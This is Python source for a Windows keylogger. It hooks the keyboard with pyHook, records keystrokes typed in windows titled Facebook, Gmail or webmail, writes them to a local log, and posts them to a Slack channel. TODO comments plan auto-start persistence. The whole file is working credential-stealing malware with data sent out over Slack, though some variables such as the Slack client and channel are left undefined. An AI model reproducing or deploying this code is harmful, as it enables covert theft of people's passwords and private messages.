import pythoncom, pyHook
import os
import sys
import logging
import win32event, win32api, winerror, win32gui
import queue
from datetime import datetime
from slackclient import SlackClient
from winreg import *

# Slack link:

# File info
FILE = 'logfile.log'
data = ''
max_length = 1

# Keywords for algorithm
key_words = ['FACEBOOK', 'GMAIL', 'WEBMAIL']

#todo :
# algorithm using event.WindowName 
# implement decorator @startup to launch keylogger when starting the computer
# post result in slack server

def on_keyboard(event):
	global data
	try:
		if is_relevant(event.WindowName, key_words):
			if event.Ascii == 13: # return pressed
				key_pressed = '\n'
			elif event.Ascii == 9: # tab pressed
				key_pressed = '\t'
			elif event.Ascii == 8:
				key_pressed = '[BACK]'
			else:
				# convert pressed key using Ascii look up table
				key_pressed = chr(event.Ascii)
			data += key_pressed
			if len(data) >= max_length:
				log_info = {'datum': datetime.now().__str__(), 'WindowName': event.WindowName,
						'data': data}
				log = "{d[datum]} :: {d[WindowName]} :: {d[data]} \n".format(d=log_info)
				data = ''
				log_on_file(FILE, log)
				log_on_cloud(slack_client, log)
		return True
	except:
		return False

def is_relevant(WindowName, key_words):
	res = False
	upper_case_wn = WindowName.upper()
	for key_word in key_words:
		if key_word in upper_case_wn:
			res = True
	return res

def log_on_file(file, data):
	# append the input data in the log file
	with open(file, 'a') as f:
		f.write(data)

def log_on_cloud(client, data):
	client.api_call(
		"chat.postMessage",
		channel=channel,
		text=data)

if __name__ == '__main__':
	hm = pyHook.HookManager()
	hm.KeyDown = on_keyboard
	hm.HookKeyboard()
	# infinite loop
	pythoncom.PumpMessages()
